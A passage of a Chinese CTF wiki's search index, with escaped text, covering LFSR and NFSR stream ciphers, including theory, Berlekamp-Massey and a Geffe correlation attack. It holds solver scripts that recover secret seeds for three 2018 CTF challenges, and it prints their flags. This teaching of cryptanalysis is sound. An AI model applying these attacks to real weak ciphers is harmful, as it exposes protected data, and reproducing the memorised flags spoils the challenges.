\u4e2a\u6bd4\u7279\u6765\u51b3\u5b9a\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u521d\u59cb\u79cd\u5b50\u7684\u7b2c\u4e00\u4e2a\u6bd4\u7279\uff0c\u8fdb\u800c\u53ef\u4ee5\u77e5\u9053\u521d\u59cb\u79cd\u5b50\u7684\u7b2c 2 \u4e2a\u6bd4\u7279\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\u4ee3\u7801\u5982\u4e0b mask = 0b10100100000010000000100010010100 b = '' N = 32 with open ( 'key' , 'rb' ) as f : b = f . read () key = '' for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): key += str ( t >> j & 1 ) idx = 0 ans = \"\" key = key [ 31 ] + key [: 32 ] while idx < 32 : tmp = 0 for i in range ( 32 ): if mask >> i & 1 : tmp ^= int ( key [ 31 - i ]) ans = str ( tmp ) + ans idx += 1 key = key [ 31 ] + str ( tmp ) + key [ 1 : 31 ] num = int ( ans , 2 ) print hex ( num ) \u8fd0\u884c \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 python exp1.py 0x926201d7 \u7b2c\u4e8c\u79cd\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u77e9\u9635\u8f6c\u6362\u7684\u8fc7\u7a0b\uff0c\u5982\u679c\u8fdb\u884c\u4e86 32 \u6b21\u7ebf\u6027\u53d8\u6362\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u8f93\u51fa\u6d41\u524d 32 \u4e2a\u6bd4\u7279\u3002\u800c\u5176\u5b9e\uff0c\u6211\u4eec\u53ea\u9700\u8981\u524d 32 \u4e2a\u6bd4\u7279\u5c31\u53ef\u4ee5\u6062\u590d\u521d\u59cb\u72b6\u6001\u4e86\u3002 mask = 0b10100100000010000000100010010100 N = 32 F = GF ( 2 ) b = '' with open ( 'key' , 'rb' ) as f : b = f . read () R = [ vector ( F , N ) for i in range ( N )] for i in range ( N ): R [ i ][ N - 1 ] = mask >> ( 31 - i ) & 1 for i in range ( N - 1 ): R [ i + 1 ][ i ] = 1 M = Matrix ( F , R ) M = M ^ N vec = vector ( F , N ) row = 0 for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): vec [ row ] = t >> j & 1 row += 1 print rank ( M ) num = int ( '' . join ( map ( str , list ( M . solve_left ( vec )))), 2 ) print hex ( num ) \u8fd0\u884c\u811a\u672c \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 sage exp.sage 32 0x926201d7 \u4ece\u800c flag \u4e3a flag{926201d7}\u3002 \u8fd8\u6709\u4e00\u79cd\u505a\u6cd5\u662f TokyoWesterns \u7684\uff0c\u53ef\u4ee5\u53c2\u8003\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u7684\u6587\u4ef6\u3002 \u9898\u76ee \u00b6 \u53c2\u8003\u6587\u732e \u00b6 \u5bc6\u7801\u5b66\u8bb2\u4e49\uff0c\u674e\u8d85\uff0c\u5c48\u9f99\u6c5f\u7f16\u8457","title":"\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668"},{"location":"crypto/streamcipher/fsr/lfsr/#-lfsr","text":"","title":"\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 - LFSR"},{"location":"crypto/streamcipher/fsr/lfsr/#_1","text":"\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u53cd\u9988\u51fd\u6570\u4e00\u822c\u5982\u4e0b a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} \u5176\u4e2d\uff0c c_j c_j \u5747\u5728\u67d0\u4e2a\u6709\u9650\u57df F_q F_q \u4e2d\u3002 \u65e2\u7136\u7ebf\u6027\u7a7a\u95f4\u662f\u4e00\u4e2a\u7ebf\u6027\u53d8\u6362\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5\u8fd9\u4e2a\u7ebf\u6027\u53d8\u6362\u4e3a \\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right] \\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right] \u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u5176\u7279\u5f81\u591a\u9879\u5f0f\u4e3a f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i} f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i} \u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u5176\u4e92\u53cd\u591a\u9879\u5f0f\u4e3a \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} \u6211\u4eec\u4e5f\u79f0\u4e92\u53cd\u591a\u9879\u5f0f\u4e3a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u8054\u7ed3\u591a\u9879\u5f0f\u3002 \u8fd9\u91cc\u6709\u4e00\u4e9b\u5b9a\u7406\u9700\u8981\u6211\u4eec\u8bb0\u4e00\u4e0b\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002","title":"\u4ecb\u7ecd"},{"location":"crypto/streamcipher/fsr/lfsr/#_2","text":"\u5df2\u77e5\u67d0\u4e2a n \u7ea7\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u7279\u5f81\u591a\u9879\u5f0f\uff0c\u90a3\u4e48\u8be5\u5e8f\u5217\u5bf9\u5e94\u7684\u751f\u6210\u51fd\u6570\u4e3a A(x)=\\frac{p(x)}{\\overline f(x)} A(x)=\\frac{p(x)}{\\overline f(x)} \u5176\u4e2d\uff0c p(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1}) p(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1}) \u3002\u53ef\u4ee5\u770b\u51fa p(x) \u5b8c\u5168\u7531\u521d\u59cb\u72b6\u6001\u548c\u53cd\u9988\u51fd\u6570\u7684\u7cfb\u6570\u51b3\u5b9a\u3002","title":"\u7279\u5f81\u591a\u9879\u5f0f\u4e0e\u751f\u6210\u51fd\u6570"},{"location":"crypto/streamcipher/fsr/lfsr/#_3","text":"\u5e8f\u5217\u7684\u7684\u5468\u671f\u4e3a\u5176\u751f\u6210\u51fd\u6570\u7684\u65e2\u7ea6\u771f\u5206\u5f0f\u7684\u5206\u6bcd\u7684\u5468\u671f\u3002 \u5bf9\u4e8e n \u7ea7\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u6700\u957f\u5468\u671f\u4e3a 2^{n-1} 2^{n-1} \uff08\u6392\u9664\u5168\u96f6\uff09\u3002\u8fbe\u5230\u6700\u957f\u5468\u671f\u7684\u5e8f\u5217\u4e00\u822c\u79f0\u4e3a m \u5e8f\u5217\u3002","title":"\u5e8f\u5217\u5468\u671f\u4e0e\u751f\u6210\u51fd\u6570"},{"location":"crypto/streamcipher/fsr/lfsr/#_4","text":"\u5c06\u4e24\u4e2a\u5e8f\u5217\u7d2f\u52a0\u5f97\u5230\u65b0\u7684\u5e8f\u5217\u7684\u5468\u671f\u4e3a\u8fd9\u4e24\u4e2a\u5e8f\u5217\u7684\u5468\u671f\u7684\u548c\u3002 \u5e8f\u5217\u662f n \u7ea7 m \u5e8f\u5217\uff0c\u5f53\u4e14\u4ec5\u5f53\u5e8f\u5217\u7684\u6781\u5c0f\u591a\u9879\u5f0f\u662f n \u6b21\u672c\u539f\u591a\u9879\u5f0f\u3002","title":"\u7279\u6b8a\u6027\u8d28"},{"location":"crypto/streamcipher/fsr/lfsr/#b-m","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u4e24\u79cd\u89d2\u5ea6\u6765\u8003\u8651 LFSR \u5bc6\u94a5\u751f\u6210\u89d2\u5ea6\uff0c\u4e00\u822c\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u7ea7\u6570\u5c3d\u53ef\u80fd\u4f4e\u7684 LFSR \u6765\u751f\u6210\u5468\u671f\u5927\uff0c\u968f\u673a\u6027\u597d\u7684\u5e8f\u5217\u3002 \u5bc6\u7801\u5206\u6790\u89d2\u5ea6\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u5e8f\u5217 a\uff0c\u5982\u4f55\u6784\u9020\u4e00\u4e2a\u7ea7\u6570\u5c3d\u53ef\u80fd\u5c0f\u7684 LFSR \u6765\u751f\u6210\u5b83\u3002\u5176\u5b9e\u8fd9\u5c31\u662f B-M \u7b97\u6cd5\u7684\u6765\u6e90\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5e8f\u5217\u7684\u7ebf\u6027\u590d\u6742\u5ea6\u5982\u4e0b \u82e5 s \u4e3a\u4e00\u4e2a\u5168\u96f6\u5e8f\u5217\uff0c\u5219\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a0\u3002 \u82e5\u6ca1\u6709 LFSR \u80fd\u751f\u6210 s\uff0c\u5219\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a\u65e0\u7a77\u3002 \u5426\u5219\uff0cs \u7684\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a\u751f\u6210 L(s) \u7684\u6700\u5c0f\u7ea7\u7684 LFSR\u3002 BM \u7b97\u6cd5\u7684\u8981\u6c42\u6211\u4eec\u9700\u8981\u77e5\u9053\u957f\u5ea6\u4e3a 2n \u7684\u5e8f\u5217\u3002\u5176\u590d\u6742\u5ea6 \u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n^2) \u6b21\u6bd4\u7279\u64cd\u4f5c \u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n) \u6bd4\u7279\u3002 \u5173\u4e8e BM \u7b97\u6cd5\u7684\u7ec6\u8282\uff0c\u540e\u7eed\u6dfb\u52a0\uff0c\u76ee\u524d\u5904\u4e8e\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u3002 \u4f46\u662f\u5176\u5b9e\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u957f\u5ea6\u4e3a 2n \u7684\u5e8f\u5217\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4e00\u79cd\u6bd4\u8f83\u7b28\u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u539f\u5148\u7684\u5e8f\u5217\u3002\u4e0d\u59a8\u5047\u8bbe\u5df2\u77e5\u7684\u5e8f\u5217\u4e3a a_1,...,a_{2n} a_1,...,a_{2n} \uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4 S_1=(a_1,...,a_n) S_1=(a_1,...,a_n) S_2=(a_2,...,a_{n+1}) S_2=(a_2,...,a_{n+1}) .... S_{n+1}=(a_{n+1},...,a_{2n}) S_{n+1}=(a_{n+1},...,a_{2n}) \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u77e9\u9635 X=(S_1,...,S_n) X=(S_1,...,S_n) \uff0c\u90a3\u4e48 S_{n+1}=(c_n,...,c_1)X S_{n+1}=(c_n,...,c_1)X \u6240\u4ee5 (c_n,...,c_1)=S_{n+1}X^{-1} (c_n,...,c_1)=S_{n+1}X^{-1} \u8fdb\u800c\u6211\u4eec\u4e5f\u5c31\u77e5\u9053\u4e86 LFSR \u7684\u53cd\u9988\u8868\u8fbe\u5f0f\uff0c\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a8\u51fa\u521d\u59cb\u5316\u79cd\u5b50\u3002","title":"B-M \u7b97\u6cd5"},{"location":"crypto/streamcipher/fsr/lfsr/#2018-streamgame1","text":"\u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 25 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) R = int ( flag [ 5 : - 1 ], 2 ) mask = 0b1010011000100011100 f = open ( \"key\" , \"ab\" ) for i in range ( 12 ): tmp = 0 for j in range ( 8 ): ( R , out ) = lfsr ( R , mask ) tmp = ( tmp << 1 ) ^ out f . write ( chr ( tmp )) f . close () \u53ef\u4ee5\u53d1\u73b0\uff0cflag \u7684\u957f\u5ea6\u4e3a25-5-1=19\uff0c\u6240\u4ee5\u53ef\u4ee5\u66b4\u529b\u679a\u4e3e\u3002\u7ed3\u679c \u279c 2018 -\u5f3a\u7f51\u676f-streamgame1 git: ( master ) \u2717 python exp.py 12 0b1110101100001101011 \u56e0\u6b64 flag \u4e3a flag{1110101100001101011}\u3002","title":"2018 \u5f3a\u7f51\u676f streamgame1"},{"location":"crypto/streamcipher/fsr/lfsr/#2018-ciscn-oldstreamgame","text":"\u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee flag = \"flag{xxxxxxxxxxxxxxxx}\" assert flag.startswith ( \"flag{\" ) assert flag.endswith ( \"}\" ) assert len ( flag )== 14 def lfsr ( R,mask ) : output = ( R << 1) & 0xffffffff i=(R&mask)&0xffffffff lastbit=0 while i!=0: lastbit^=(i&1 ) i = i>>1 output^ = lastbit return ( output,lastbit ) R = int ( flag [ 5 :-1 ] ,16 ) mask = 0b10100100000010000000100010010100 f = open ( \"key\" , \"w\" ) for i in range ( 100 ) : tmp = 0 for j in range ( 8 ) : ( R,out )= lfsr ( R,mask ) tmp =( tmp << 1 ) ^out f.write ( chr ( tmp )) f.close () \u7a0b\u5e8f\u5f88\u7b80\u5355\uff0c\u4ecd\u7136\u662f\u4e00\u4e2a LFSR\uff0c\u4f46\u662f\u521d\u6001\u662f 32 \u6bd4\u7279\u4f4d\uff0c\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u7206\u7834\uff0c\u4f46\u662f\u8fd9\u91cc\u4e0d\u9009\u62e9\u7206\u7834\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e24\u79cd\u505a\u6cd5\u3002 \u7b2c\u4e00\u79cd\u505a\u6cd5\uff0c\u7a0b\u5e8f\u8f93\u51fa\u7684\u7b2c 32 \u4e2a\u6bd4\u7279\u662f\u7531\u7a0b\u5e8f\u8f93\u51fa\u7684\u524d 31 \u4e2a\u6bd4\u7279\u548c\u521d\u59cb\u79cd\u5b50\u7684\u7b2c 1 \u4e2a\u6bd4\u7279\u6765\u51b3\u5b9a\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u521d\u59cb\u79cd\u5b50\u7684\u7b2c\u4e00\u4e2a\u6bd4\u7279\uff0c\u8fdb\u800c\u53ef\u4ee5\u77e5\u9053\u521d\u59cb\u79cd\u5b50\u7684\u7b2c 2 \u4e2a\u6bd4\u7279\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\u4ee3\u7801\u5982\u4e0b mask = 0b10100100000010000000100010010100 b = '' N = 32 with open ( 'key' , 'rb' ) as f : b = f . read () key = '' for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): key += str ( t >> j & 1 ) idx = 0 ans = \"\" key = key [ 31 ] + key [: 32 ] while idx < 32 : tmp = 0 for i in range ( 32 ): if mask >> i & 1 : tmp ^= int ( key [ 31 - i ]) ans = str ( tmp ) + ans idx += 1 key = key [ 31 ] + str ( tmp ) + key [ 1 : 31 ] num = int ( ans , 2 ) print hex ( num ) \u8fd0\u884c \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 python exp1.py 0x926201d7 \u7b2c\u4e8c\u79cd\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u77e9\u9635\u8f6c\u6362\u7684\u8fc7\u7a0b\uff0c\u5982\u679c\u8fdb\u884c\u4e86 32 \u6b21\u7ebf\u6027\u53d8\u6362\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u8f93\u51fa\u6d41\u524d 32 \u4e2a\u6bd4\u7279\u3002\u800c\u5176\u5b9e\uff0c\u6211\u4eec\u53ea\u9700\u8981\u524d 32 \u4e2a\u6bd4\u7279\u5c31\u53ef\u4ee5\u6062\u590d\u521d\u59cb\u72b6\u6001\u4e86\u3002 mask = 0b10100100000010000000100010010100 N = 32 F = GF ( 2 ) b = '' with open ( 'key' , 'rb' ) as f : b = f . read () R = [ vector ( F , N ) for i in range ( N )] for i in range ( N ): R [ i ][ N - 1 ] = mask >> ( 31 - i ) & 1 for i in range ( N - 1 ): R [ i + 1 ][ i ] = 1 M = Matrix ( F , R ) M = M ^ N vec = vector ( F , N ) row = 0 for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): vec [ row ] = t >> j & 1 row += 1 print rank ( M ) num = int ( '' . join ( map ( str , list ( M . solve_left ( vec )))), 2 ) print hex ( num ) \u8fd0\u884c\u811a\u672c \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 sage exp.sage 32 0x926201d7 \u4ece\u800c flag \u4e3a flag{926201d7}\u3002 \u8fd8\u6709\u4e00\u79cd\u505a\u6cd5\u662f TokyoWesterns \u7684\uff0c\u53ef\u4ee5\u53c2\u8003\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u7684\u6587\u4ef6\u3002","title":"2018 CISCN \u521d\u8d5b oldstreamgame"},{"location":"crypto/streamcipher/fsr/lfsr/#_5","text":"","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/fsr/lfsr/#_6","text":"\u5bc6\u7801\u5b66\u8bb2\u4e49\uff0c\u674e\u8d85\uff0c\u5c48\u9f99\u6c5f\u7f16\u8457","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/streamcipher/fsr/nfsr/","text":"\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 \u00b6 \u4ecb\u7ecd \u00b6 \u4e3a\u4e86\u4f7f\u5f97\u5bc6\u94a5\u6d41\u8f93\u51fa\u7684\u5e8f\u5217\u5c3d\u53ef\u80fd\u590d\u6742\uff0c\u4f1a\u4f7f\u7528\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u5e38\u89c1\u7684\u6709\u4e09\u79cd \u975e\u7ebf\u6027\u7ec4\u5408\u751f\u6210\u5668\uff0c\u5bf9\u591a\u4e2a LFSR \u7684\u8f93\u51fa\u4f7f\u7528\u4e00\u4e2a\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570 \u975e\u7ebf\u6027\u6ee4\u6ce2\u751f\u6210\u5668\uff0c\u5bf9\u4e00\u4e2a LFSR \u7684\u5185\u5bb9\u4f7f\u7528\u4e00\u4e2a\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570 \u949f\u63a7\u751f\u6210\u5668\uff0c\u4f7f\u7528\u4e00\u4e2a\uff08\u6216\u591a\u4e2a\uff09LFSR \u7684\u8f93\u51fa\u6765\u63a7\u5236\u53e6\u4e00\u4e2a\uff08\u6216\u591a\u4e2a\uff09LFSR \u7684\u65f6\u949f \u975e\u7ebf\u6027\u7ec4\u5408\u751f\u6210\u5668 \u00b6 \u7b80\u4ecb \u00b6 \u7ec4\u5408\u751f\u6210\u5668\u4e00\u822c\u5982\u4e0b\u56fe\u6240\u793a\u3002 Geffe \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 Geffe \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002Geffe \u5305\u542b 3 \u4e2a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570\u4e3a F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3 F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3 2018 \u5f3a\u7f51\u676f streamgame3 \u00b6 \u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 24 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW ,( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1 = int ( flag [ 5 : 11 ], 16 ) R2 = int ( flag [ 11 : 17 ], 16 ) R3 = int ( flag [ 17 : 23 ], 16 ) assert len ( bin ( R1 )[ 2 :]) == 17 assert len ( bin ( R2 )[ 2 :]) == 19 assert len ( bin ( R3 )[ 2 :]) == 21 R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 for fi in range ( 1024 ): print fi tmp1mb = \"\" for i in range ( 1024 ): tmp1kb = \"\" for j in range ( 1024 ): tmp = 0 for k in range ( 8 ): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) tmp = ( tmp << 1 ) ^ out tmp1kb += chr ( tmp ) tmp1mb += tmp1kb f = open ( \"./output/\" + str ( fi ), \"ab\" ) f . write ( tmp1mb ) f . close () \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u4e0e Geffe \u751f\u6210\u5668\u975e\u5e38\u7c7b\u4f3c\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u76f8\u5173\u653b\u51fb\u65b9\u6cd5\u8fdb\u884c\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u7edf\u8ba1\u4e00\u4e0b\u5728\u4e09\u4e2a LFSR \u8f93\u51fa\u4e0d\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u540e\u7c7b Geffe \u751f\u6210\u5668\u7684\u8f93\u51fa\uff0c\u5982\u4e0b x_1 x_1 x_2 x_2 x_3 x_3 F(x_1,x_2,x_3) F(x_1,x_2,x_3) 0 0 0 0 0 0 1 1 0 1 0 0 0 1 1 0 1 0 0 0 1 0 1 1 1 1 0 1 1 1 1 1 \u53ef\u4ee5\u53d1\u73b0 Geffe \u7684\u8f93\u51fa\u4e0e x_1 x_1 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.75 Geffe \u7684\u8f93\u51fa\u4e0e x_2 x_2 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.5 Geffe \u7684\u8f93\u51fa\u4e0e x_3 x_3 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.75 \u8fd9\u8bf4\u660e\u8f93\u51fa\u4e0e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e09\u4e2a\u7684\u5173\u8054\u6027\u975e\u5e38\u5927\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u53bb\u679a\u4e3e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e09\u4e2a LFSR \u7684\u8f93\u51fa\u5224\u65ad\u5176\u4e0e \u7c7b Geffe \u7684\u8f93\u51fa\u76f8\u7b49\u7684\u4e2a\u6570\uff0c\u5982\u679c\u5927\u7ea6\u5728 75% \u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f\u6b63\u786e\u7684\u3002\u7b2c\u4e8c\u4e2a\u5c31\u76f4\u63a5\u66b4\u529b\u679a\u4e3e\u4e86\u3002 \u811a\u672c\u5982\u4e0b #for x1 in range(2): # for x2 in range(2): # for x3 in range(2): # print x1,x2,x3,(x1*x2)^((x2^1)*x3) #n = [17,19,21] #cycle = 1 #for i in n: # cycle = cycle*(pow(2,i)-1) #print cycle def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW , ( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 n3 = 21 n2 = 19 n1 = 17 def guess ( beg , end , num , mask ): ansn = range ( beg , end ) data = open ( './output/0' ) . read ( num ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) now = 0 res = 0 for i in ansn : r = i cnt = 0 for j in range ( num * 8 ): r , lastbit = lfsr ( r , mask ) lastbit = str ( lastbit ) cnt += ( lastbit == data [ j ]) if cnt > now : now = cnt res = i print now , res return res def bruteforce2 ( x , z ): data = open ( './output/0' ) . read ( 50 ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) for y in range ( pow ( 2 , n2 - 1 ), pow ( 2 , n2 )): R1 , R2 , R3 = x , y , z flag = True for i in range ( len ( data )): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) if str ( out ) != data [ i ]: flag = False break if y % 10000 == 0 : print 'now: ' , x , y , z if flag : print 'ans: ' , hex ( x )[ 2 :], hex ( y )[ 2 :], hex ( z )[ 2 :] break R1 = guess ( pow ( 2 , n1 - 1 ), pow ( 2 , n1 ), 40 , R1_mask ) print R1 R3 = guess ( pow ( 2 , n3 - 1 ), pow ( 2 , n3 ), 40 , R3_mask ) print R3 R1 = 113099 R3 = 1487603 bruteforce2 ( R1 , R3 ) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u279c 2018 -CISCN-start-streamgame3 git: ( master ) \u2717 python exp.py 161 65536 172 65538 189 65545 203 65661 210 109191 242 113099 113099 157 1048576 165 1048578 183 1048580 184 1049136 186 1049436 187 1049964 189 1050869 190 1051389 192 1051836 194 1053573 195 1055799 203 1060961 205 1195773 212 1226461 213 1317459 219 1481465 239 1487603 1487603 now: 113099 270000 1487603 now: 113099 280000 1487603 now: 113099 290000 1487603 now: 113099 300000 1487603 now: 113099 310000 1487603 now: 113099 320000 1487603 now: 113099 330000 1487603 now: 113099 340000 1487603 now: 113099 350000 1487603 now: 113099 360000 1487603 ans: 1b9cb 5979c 16b2f3 \u4ece\u800c flag \u4e3a flag{01b9cb05979c16b2f3}\u3002 \u9898\u76ee \u00b6 2017 WHCTF Bornpig 2018 Google CTF 2018 Betterzip \u53c2\u8003 \u00b6 https://www.rocq.inria.fr/secret/Anne.Canteaut/MPRI/chapter3.pdf http://data.at.preempted.net/INDEX/articles/Correlation_Attacks_Geffe.pdf","title":"\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668"},{"location":"crypto/streamcipher/fsr/nfsr/#_1","text":"","title":"\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668"},{"location":"crypto/streamcipher/fsr/nfsr/#_2","text":"\u4e3a\u4e86\u4f7f\u5f97\u5bc6\u94a5\u6d41\u8f93\u51fa\u7684\u5e8f\u5217\u5c3d\u53ef\u80fd\u590d\u6742\uff0c\u4f1a\u4f7f\u7528\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u5e38\u89c1\u7684\u6709\u4e09\u79cd \u975e\u7ebf\u6027\u7ec4\u5408\u751f\u6210\u5668\uff0c\u5bf9\u591a\u4e2a LFSR \u7684\u8f93\u51fa\u4f7f\u7528\u4e00\u4e2a\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570 \u975e\u7ebf\u6027\u6ee4\u6ce2\u751f\u6210\u5668\uff0c\u5bf9\u4e00\u4e2a LFSR \u7684\u5185\u5bb9\u4f7f\u7528\u4e00\u4e2a\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570 